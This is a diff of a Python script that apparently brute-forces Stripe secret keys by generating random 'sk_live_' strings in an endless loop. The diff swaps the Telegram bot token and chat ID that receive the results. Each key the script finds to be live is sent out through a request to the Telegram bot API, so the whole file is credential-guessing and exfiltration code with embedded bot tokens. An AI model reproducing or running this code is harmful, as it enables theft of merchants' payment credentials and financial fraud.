@@ -8,7 +8,7 @@ def long_key():
     print(f"DEAD > {skkey}")
   else:
     print(f"LIVE > {skkey}")
-    requests.get(url=f"https://api.telegram.org/bot5624443135:AAFPhl4KG-1JF8MR5X2qpWHgxgxeQMT5jp8/sendMessage?chat_id=5195866238&text=LIVE > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot5695100565:AAEZD-8i5Xtzq-QEP1a-3hlrPF844QBZAnc/sendMessage?chat_id=1745334635&text=LIVE > {skkey}")
     
 def short_key():
   skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
@@ -17,7 +17,7 @@ def short_key():
     print(f"DEAD > {skkey}")
   else:
     print(f"LIVE > {skkey}")
-    requests.get(url=f"https://api.telegram.org/bot5624443135:AAFPhl4KG-1JF8MR5X2qpWHgxgxeQMT5jp8/sendMessage?chat_id=5195866238&text=LIVE > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot5695100565:AAEZD-8i5Xtzq-QEP1a-3hlrPF844QBZAnc/sendMessage?chat_id=1745334635&text=LIVE > {skkey}")
     
 while True:
   long_key()
